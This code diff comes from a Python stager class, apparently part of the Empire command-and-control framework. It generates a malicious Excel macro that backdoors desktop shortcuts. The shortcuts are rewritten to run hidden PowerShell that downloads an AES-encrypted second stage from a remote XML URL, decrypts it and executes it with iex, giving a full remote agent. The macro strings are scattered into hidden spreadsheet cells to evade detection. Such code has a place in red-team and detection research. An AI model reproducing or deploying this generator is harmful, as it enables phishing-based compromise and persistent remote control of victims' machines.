@@ -281,201 +281,201 @@ class Stager:
         if launcher == "":
             log.error("[!] Error in launcher command generation.")
             return ""
+
+        try:
+            reader = xlrd.open_workbook(xls_out)
+            work_book = copy(reader)
+            active_sheet = work_book.get_sheet(0)
+        except OSError:
+            work_book = Workbook()
+            active_sheet = work_book.add_sheet("Sheet1")
+
+        # sets initial coords for writing data to
+        input_row = random.randint(50, 70)
+        input_col = random.randint(40, 60)
+
+        # build out the macro - first take all strings that would normally go into the macro and place them into random cells, which we then reference in our macro
+        macro = "Sub Auto_Close()\n"
+
+        active_sheet.write(input_row, input_col, "Wscript.shell")
+        macro += (
+            "Set "
+            + shell_var
+            + ' = CreateObject(activeSheet.Range("'
+            + self.coordsToCell(input_row, input_col)
+            + '").value)\n'
+        )
+        input_col = input_col + random.randint(1, 4)
+
+        active_sheet.write(
+            input_row,
+            input_col,
+            "Scripting.FileSystemObject",
+        )
+        macro += (
+            "Set "
+            + fso_var
+            + ' = CreateObject(activeSheet.Range("'
+            + self.coordsToCell(input_row, input_col)
+            + '").value)\n'
+        )
+        input_col = input_col + random.randint(1, 4)
+
+        active_sheet.write(input_row, input_col, "desktop")
+        macro += (
+            "Set "
+            + folder_var
+            + " = "
+            + fso_var
+            + ".GetFolder("
+            + shell_var
+            + '.SpecialFolders(activeSheet.Range("'
+            + self.coordsToCell(input_row, input_col)
+            + '").value))\n'
+        )
+        macro += "For Each " + file_var + " In " + folder_var + ".Files\n"
+
+        macro += "If(InStr(Lcase(" + file_var + '), ".lnk")) Then\n'
+        macro += (
+            "Set "
+            + lnk_var
+            + " = "
+            + shell_var
+            + ".CreateShortcut("
+            + shell_var
+            + '.SPecialFolders(activeSheet.Range("'
+            + self.coordsToCell(input_row, input_col)
+            + '").value) & "\\" & '
+            + file_var
+            + ".name)\n"
+        )
+        input_col = input_col + random.randint(1, 4)
+
+        macro += "If("
+        for i, _item in enumerate(target_exe):
+            if i:
+                macro += " or "
+            active_sheet.write(input_row, input_col, _item.strip().lower() + ".")
+            macro += (
+                "InStr(Lcase("
+                + lnk_var
+                + '.targetPath), activeSheet.Range("'
+                + self.coordsToCell(input_row, input_col)
+                + '").value)'
+            )
+            input_col = input_col + random.randint(1, 4)
+        macro += ") Then\n"
+        # launchString contains the code that will get insterted into the backdoored .lnk files, it will first launch the original target exe, then clean up all backdoors on the desktop.  After cleanup is completed it will check the current date, if it is prior to the killdate the second stage will then be downloaded from the webserver selected during macro generation, and then decrypted using the key and iv created during this same process.  This code is then executed to gain a full agent on the remote system.
+        launch_string1 = "hidden -nop -c \"Start('"
+        launch_string2 = r");$u=New-Object -comObject wscript.shell;gci -Pa $env:USERPROFILE\desktop -Fi *.lnk|%{$l=$u.createShortcut($_.FullName);if($l.arguments-like'*xml.xmldocument*'){$s=$l.arguments.IndexOf('''')+1;$r=$l.arguments.Substring($s, $l.arguments.IndexOf('''',$s)-$s);$l.targetPath=$r;$l.Arguments='';$l.Save()}};$b=New-Object System.Xml.XmlDocument;if([int](get-date -U "
+        launch_string3 = (
+            ") -le "
+            + str(kill_date[2])
+            + str(kill_date[0])
+            + str(kill_date[1])
+            + "){$b.Load('"
+        )
+        launch_string4 = (
+            "');$a=New-Object 'Security.Cryptography.AesManaged';$a.IV=("
+            + str(enc_iv)
+            + ".."
+            + str(enc_iv + 15)
+            + ");$a.key=[text.encoding]::UTF8.getBytes('"
+        )
+        launch_string5 = "');$by=[System.Convert]::FromBase64String($b.main);[Text.Encoding]::UTF8.GetString($a.CreateDecryptor().TransformFinalBlock($by,0,$by.Length)).substring(16)|iex}\""
+
+        # part of the macro that actually modifies the LNK files on the desktop, sets icon location for updated lnk to the old targetpath, args to our launch code, and target to powershell so we can do a direct call to it
+        macro += lnk_var + ".IconLocation = " + lnk_var + ".targetpath\n"
+        launch_string_sum = (
+            launch_string2
+            + "'%Y%m%d'"
+            + launch_string3
+            + xml_path
+            + launch_string4
+            + enc_key
+            + launch_string5
+        )
+
+        active_sheet.write(input_row, input_col, launch_string1)
+        launch1_coords = self.coordsToCell(input_row, input_col)
+        input_col = input_col + random.randint(1, 4)
+        active_sheet.write(input_row, input_col, launch_string_sum)
+        launch_sum_coords = self.coordsToCell(input_row, input_col)
+        input_col = input_col + random.randint(1, 4)
+
+        macro += (
+            lnk_var
+            + '.arguments = "-w " & activeSheet.Range("'
+            + launch1_coords
+            + '").Value & '
+            + lnk_var
+            + ".targetPath"
+            + ' & "\'" & activeSheet.Range("'
+            + launch_sum_coords
+            + '").Value'
+            + "\n"
+        )
+
+        active_sheet.write(
+            input_row,
+            input_col,
+            ":\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        )
+        macro += (
+            lnk_var
+            + '.targetpath = left(CurDir, InStr(CurDir, ":")-1) & activeSheet.Range("'
+            + self.coordsToCell(input_row, input_col)
+            + '").value\n'
+        )
+        input_col = input_col + random.randint(1, 4)
+        # macro will not write backdoored lnk file if resulting args will be > 1024 length (max arg length) - this is to avoid an incomplete statement that results in a powershell error on run, which causes no execution of any programs and no cleanup of backdoors
+        macro += "if(Len(" + lnk_var + ".arguments) < 1023) Then\n"
+        macro += lnk_var + ".save\n"
+        macro += "end if\n"
+        macro += "end if\n"
+        macro += "end if\n"
+        macro += "next " + file_var + "\n"
+        macro += "End Sub\n"
+        active_sheet.row(input_row).hidden = True
+        log.info("Writing xls...")
+        work_book.save(xls_out)
+        log.info(
+            "xls written to "
+            + xls_out
+            + "  please remember to add macro code to xls prior to use"
+        )
+
+        # encrypt the second stage code that will be dropped into the XML - this is the full empire stager that gets pulled once the user clicks on the backdoored shortcut
+        iv_buf = b""
+        for z in range(0, 16):
+            iv = enc_iv + z
+            iv = iv.to_bytes(1, byteorder="big")
+            iv_buf = b"".join([iv_buf, iv])
+
+        encryptor = AES.new(enc_key.encode("UTF-8"), AES.MODE_CBC, iv_buf)
+
+        # pkcs7 padding - aes standard on Windows - if this padding mechanism is used we do not need to define padding in our macro code, saving space
+        padding = 16 - (len(launcher) % 16)
+        if padding == 0:
+            launcher = launcher + ("\x00" * 16)
         else:
-            try:
-                reader = xlrd.open_workbook(xls_out)
-                work_book = copy(reader)
-                active_sheet = work_book.get_sheet(0)
-            except OSError:
-                work_book = Workbook()
-                active_sheet = work_book.add_sheet("Sheet1")
+            launcher = launcher + (chr(padding) * padding)
 
-            # sets initial coords for writing data to
-            input_row = random.randint(50, 70)
-            input_col = random.randint(40, 60)
+        cipher_text = encryptor.encrypt(launcher.encode("UTF-8"))
+        cipher_text = helpers.encode_base64(b"".join([iv_buf, cipher_text]))
 
-            # build out the macro - first take all strings that would normally go into the macro and place them into random cells, which we then reference in our macro
-            macro = "Sub Auto_Close()\n"
+        # write XML to disk
+        log.info("Writing xml...")
+        with open(xml_out, "wb") as file_write:
+            file_write.write(b'<?xml version="1.0"?>\n')
+            file_write.write(b"<main>")
+            file_write.write(cipher_text)
+            file_write.write(b"</main>\n")
+        log.info(
+            "xml written to "
+            + xml_out
+            + " please remember this file must be accessible by the target at this url: "
+            + xml_path
+        )
 
-            active_sheet.write(input_row, input_col, "Wscript.shell")
-            macro += (
-                "Set "
-                + shell_var
-                + ' = CreateObject(activeSheet.Range("'
-                + self.coordsToCell(input_row, input_col)
-                + '").value)\n'
-            )
-            input_col = input_col + random.randint(1, 4)
-
-            active_sheet.write(
-                input_row,
-                input_col,
-                "Scripting.FileSystemObject",
-            )
-            macro += (
-                "Set "
-                + fso_var
-                + ' = CreateObject(activeSheet.Range("'
-                + self.coordsToCell(input_row, input_col)
-                + '").value)\n'
-            )
-            input_col = input_col + random.randint(1, 4)
-
-            active_sheet.write(input_row, input_col, "desktop")
-            macro += (
-                "Set "
-                + folder_var
-                + " = "
-                + fso_var
-                + ".GetFolder("
-                + shell_var
-                + '.SpecialFolders(activeSheet.Range("'
-                + self.coordsToCell(input_row, input_col)
-                + '").value))\n'
-            )
-            macro += "For Each " + file_var + " In " + folder_var + ".Files\n"
-
-            macro += "If(InStr(Lcase(" + file_var + '), ".lnk")) Then\n'
-            macro += (
-                "Set "
-                + lnk_var
-                + " = "
-                + shell_var
-                + ".CreateShortcut("
-                + shell_var
-                + '.SPecialFolders(activeSheet.Range("'
-                + self.coordsToCell(input_row, input_col)
-                + '").value) & "\\" & '
-                + file_var
-                + ".name)\n"
-            )
-            input_col = input_col + random.randint(1, 4)
-
-            macro += "If("
-            for i, _item in enumerate(target_exe):
-                if i:
-                    macro += " or "
-                active_sheet.write(input_row, input_col, _item.strip().lower() + ".")
-                macro += (
-                    "InStr(Lcase("
-                    + lnk_var
-                    + '.targetPath), activeSheet.Range("'
-                    + self.coordsToCell(input_row, input_col)
-                    + '").value)'
-                )
-                input_col = input_col + random.randint(1, 4)
-            macro += ") Then\n"
-            # launchString contains the code that will get insterted into the backdoored .lnk files, it will first launch the original target exe, then clean up all backdoors on the desktop.  After cleanup is completed it will check the current date, if it is prior to the killdate the second stage will then be downloaded from the webserver selected during macro generation, and then decrypted using the key and iv created during this same process.  This code is then executed to gain a full agent on the remote system.
-            launch_string1 = "hidden -nop -c \"Start('"
-            launch_string2 = r");$u=New-Object -comObject wscript.shell;gci -Pa $env:USERPROFILE\desktop -Fi *.lnk|%{$l=$u.createShortcut($_.FullName);if($l.arguments-like'*xml.xmldocument*'){$s=$l.arguments.IndexOf('''')+1;$r=$l.arguments.Substring($s, $l.arguments.IndexOf('''',$s)-$s);$l.targetPath=$r;$l.Arguments='';$l.Save()}};$b=New-Object System.Xml.XmlDocument;if([int](get-date -U "
-            launch_string3 = (
-                ") -le "
-                + str(kill_date[2])
-                + str(kill_date[0])
-                + str(kill_date[1])
-                + "){$b.Load('"
-            )
-            launch_string4 = (
-                "');$a=New-Object 'Security.Cryptography.AesManaged';$a.IV=("
-                + str(enc_iv)
-                + ".."
-                + str(enc_iv + 15)
-                + ");$a.key=[text.encoding]::UTF8.getBytes('"
-            )
-            launch_string5 = "');$by=[System.Convert]::FromBase64String($b.main);[Text.Encoding]::UTF8.GetString($a.CreateDecryptor().TransformFinalBlock($by,0,$by.Length)).substring(16)|iex}\""
-
-            # part of the macro that actually modifies the LNK files on the desktop, sets icon location for updated lnk to the old targetpath, args to our launch code, and target to powershell so we can do a direct call to it
-            macro += lnk_var + ".IconLocation = " + lnk_var + ".targetpath\n"
-            launch_string_sum = (
-                launch_string2
-                + "'%Y%m%d'"
-                + launch_string3
-                + xml_path
-                + launch_string4
-                + enc_key
-                + launch_string5
-            )
-
-            active_sheet.write(input_row, input_col, launch_string1)
-            launch1_coords = self.coordsToCell(input_row, input_col)
-            input_col = input_col + random.randint(1, 4)
-            active_sheet.write(input_row, input_col, launch_string_sum)
-            launch_sum_coords = self.coordsToCell(input_row, input_col)
-            input_col = input_col + random.randint(1, 4)
-
-            macro += (
-                lnk_var
-                + '.arguments = "-w " & activeSheet.Range("'
-                + launch1_coords
-                + '").Value & '
-                + lnk_var
-                + ".targetPath"
-                + ' & "\'" & activeSheet.Range("'
-                + launch_sum_coords
-                + '").Value'
-                + "\n"
-            )
-
-            active_sheet.write(
-                input_row,
-                input_col,
-                ":\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-            )
-            macro += (
-                lnk_var
-                + '.targetpath = left(CurDir, InStr(CurDir, ":")-1) & activeSheet.Range("'
-                + self.coordsToCell(input_row, input_col)
-                + '").value\n'
-            )
-            input_col = input_col + random.randint(1, 4)
-            # macro will not write backdoored lnk file if resulting args will be > 1024 length (max arg length) - this is to avoid an incomplete statement that results in a powershell error on run, which causes no execution of any programs and no cleanup of backdoors
-            macro += "if(Len(" + lnk_var + ".arguments) < 1023) Then\n"
-            macro += lnk_var + ".save\n"
-            macro += "end if\n"
-            macro += "end if\n"
-            macro += "end if\n"
-            macro += "next " + file_var + "\n"
-            macro += "End Sub\n"
-            active_sheet.row(input_row).hidden = True
-            log.info("Writing xls...")
-            work_book.save(xls_out)
-            log.info(
-                "xls written to "
-                + xls_out
-                + "  please remember to add macro code to xls prior to use"
-            )
-
-            # encrypt the second stage code that will be dropped into the XML - this is the full empire stager that gets pulled once the user clicks on the backdoored shortcut
-            iv_buf = b""
-            for z in range(0, 16):
-                iv = enc_iv + z
-                iv = iv.to_bytes(1, byteorder="big")
-                iv_buf = b"".join([iv_buf, iv])
-
-            encryptor = AES.new(enc_key.encode("UTF-8"), AES.MODE_CBC, iv_buf)
-
-            # pkcs7 padding - aes standard on Windows - if this padding mechanism is used we do not need to define padding in our macro code, saving space
-            padding = 16 - (len(launcher) % 16)
-            if padding == 0:
-                launcher = launcher + ("\x00" * 16)
-            else:
-                launcher = launcher + (chr(padding) * padding)
-
-            cipher_text = encryptor.encrypt(launcher.encode("UTF-8"))
-            cipher_text = helpers.encode_base64(b"".join([iv_buf, cipher_text]))
-
-            # write XML to disk
-            log.info("Writing xml...")
-            with open(xml_out, "wb") as file_write:
-                file_write.write(b'<?xml version="1.0"?>\n')
-                file_write.write(b"<main>")
-                file_write.write(cipher_text)
-                file_write.write(b"</main>\n")
-            log.info(
-                "xml written to "
-                + xml_out
-                + " please remember this file must be accessible by the target at this url: "
-                + xml_path
-            )
-
-            return macro
+        return macro
